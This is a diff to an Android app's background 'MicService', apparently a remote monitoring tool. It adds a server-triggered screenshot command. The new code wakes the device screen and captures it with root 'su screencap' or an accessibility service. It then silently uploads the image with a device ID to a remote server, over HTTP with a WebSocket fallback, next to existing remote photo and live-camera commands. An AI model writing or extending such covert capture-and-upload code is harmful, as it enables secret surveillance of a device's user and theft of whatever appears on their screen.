@@ -9,6 +9,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.graphics.Canvas
 import android.graphics.ColorMatrix
@@ -1664,6 +1665,9 @@ class MicService : Service() {
                     // Bug 6.4: Don't ACK here - ACK only after captureAndSendPhoto completes
                     captureAndSendPhoto(camera)
                 }
+                "take_screenshot" -> {
+                    captureAndSendScreenshot()
+                }
                 "camera_live_start" -> {
                     val camera = obj.optString("camera", "current").trim().lowercase()
                     val explicitFacing = parseRequestedCameraFacing(camera)
@@ -2368,6 +2372,129 @@ class MicService : Service() {
                 }
             }
         }
+    }
+
+    @SuppressLint("ObsoleteSdkInt")
+    private fun captureAndSendScreenshot() {
+        serviceScope.launch(Dispatchers.IO) {
+            var tempWakeLock: PowerManager.WakeLock? = null
+            try {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                if (!pm.isInteractive) {
+                    @Suppress("DEPRECATION")
+                    val flags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP
+                    tempWakeLock = pm.newWakeLock(flags, "Monitor:ScreenshotWake")
+                    tempWakeLock.acquire(3000L) // Auto release after 3s
+                    delay(800L) // Give display time to wake up and draw the lock screen
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to wake screen: ${e.message}")
+            }
+
+            try {
+                // Try rooted approach first
+                val rootScreenshot = withTimeoutOrNull(10000L) {
+                    var process: Process? = null
+                    try {
+                        process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p"))
+                        val bytes = process.inputStream.readBytes()
+                        process.waitFor()
+                        if (process.exitValue() == 0 && bytes.isNotEmpty()) bytes else null
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Root screenshot exception: ${e.message}")
+                        null
+                    } finally {
+                        try {
+                            process?.destroy()
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Failed to destroy su process: ${e.message}")
+                        }
+                    }
+                }
+
+                if (rootScreenshot != null) {
+                    uploadScreenshotBytes(rootScreenshot)
+                    return@launch
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Root screenshot failed: ${e.message}")
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                val accessibilityInstance = MonitorAccessibilityService.instance
+                if (accessibilityInstance != null) {
+                    accessibilityInstance.captureScreen { bitmap ->
+                        if (bitmap != null) {
+                            serviceScope.launch(Dispatchers.IO) {
+                                val stream = java.io.ByteArrayOutputStream()
+                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
+                                val jpegBytes = stream.toByteArray()
+                                bitmap.recycle()
+                                uploadScreenshotBytes(jpegBytes)
+                            }
+                        } else {
+                            sendCommandAck("take_screenshot", "error", "capture_failed")
+                        }
+                    }
+                } else {
+                    sendCommandAck("take_screenshot", "error", "accessibility_service_not_running")
+                }
+            } else {
+                sendCommandAck("take_screenshot", "error", "unsupported_android_version")
+            }
+        }
+    }
+
+    private fun uploadScreenshotBytes(jpegBytes: ByteArray) {
+        val filename = "screenshot_${deviceId}_${System.currentTimeMillis()}.jpg"
+        var httpSuccess = false
+        try {
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("deviceId", deviceId)
+                .addFormDataPart(
+                    "photo",
+                    filename,
+                    jpegBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
+                )
+                .build()
+
+            val request = Request.Builder()
+                .url("$serverHttpBaseUrl/api/upload-photo")
+                .post(requestBody)
+                .addHeader("X-Filename", filename)
+                .addHeader("X-Device-Id", deviceId)
+                .build()
+
+            val response = photoUploadClient.newCall(request).execute()
+            httpSuccess = response.isSuccessful
+            response.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "HTTP screenshot upload failed: ${e.message}")
+        }
+
+        if (!httpSuccess) {
+            Log.w(TAG, "Falling back to WebSocket binary for screenshot")
+            val msgJson = JSONObject().apply {
+                put("type", "screenshot_upload")
+                put("deviceId", deviceId)
+                put("filename", filename)
+                put("mime", "image/jpeg")
+                put("ts", System.currentTimeMillis())
+            }.toString()
+            val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
+            val headerLen = headerBytes.size
+
+            val out = ByteArray(4 + headerLen + jpegBytes.size)
+            out[0] = 0x43 // 'C'
+            out[1] = 0x4C // 'L'
+            out[2] = ((headerLen shr 8) and 0xFF).toByte()
+            out[3] = (headerLen and 0xFF).toByte()
+            System.arraycopy(headerBytes, 0, out, 4, headerLen)
+            System.arraycopy(jpegBytes, 0, out, 4 + headerLen, jpegBytes.size)
+            safeSend(okio.ByteString.of(*out))
+        }
+        sendCommandAck("take_screenshot", "success")
     }
 
     private fun parseRequestedCameraFacing(cameraMode: String): Int? {
